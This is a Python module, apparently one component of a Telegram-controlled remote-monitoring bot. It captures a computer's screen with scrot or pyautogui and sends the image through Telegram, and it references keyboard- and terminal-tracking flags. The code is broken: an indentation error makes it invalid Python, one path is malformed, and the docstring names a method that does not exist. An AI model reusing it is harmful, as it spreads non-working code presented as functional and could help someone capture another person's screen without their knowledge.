'''This module createt screenshot you screen pc'''

import os
import subprocess
import pyautogui
from aiogram.types import FSInputFile



class ScreenshotPC:
    '''    Класс `ScreenshotPC` предоставляет функционал для создания снимков экрана
            и отправки их через Telegram-бота.

    Attributes:
        tracking_logic_keyboard (object): Объект, предоставляющий логику отслеживания клавиатуры.
        tracking_logic_terminal (object): Объект, предоставляющий логику отслеживания терминала.

    Methods:
        scren(self, message): Создает снимок экрана и отправляет его через Telegram-бота.
'''

    def __init__(self):
        from controller import control_variable
        self.control_variable = control_variable

    async def scren_linux(self, message):
        '''Делает скриншот экран инструментом scrot. ONLY linux
            Принимает message'''
        await message.delete()
            keyboard = getattr(self.control_variable, 'tracking_logic_keyboard')
            terminal = getattr(self.control_variable, 'tracking_logic_terminal')
       
            
        if not (keyboard and terminal):
            subprocess.call(['scrot', '/home/deogen/pythonProject2/screen.png'])
            file = FSInputFile('/home/deogen/pythonProject2/screen.png')
            await message.answer_photo(file)
            os.remove('/home//deogen//pythonProject2/screen.png')

    async def scren_windows(self, message):
        ph = pyautogui.screenshot()
        ph.save("screen.png")
        scren = FSInputFile("C:\\Users\\murad\\pythonProject2\\screen.png")
        await message.answer_photo(scren)
        os.remove("C:\\Users\\murad\\pythonProject2\\screen.png")
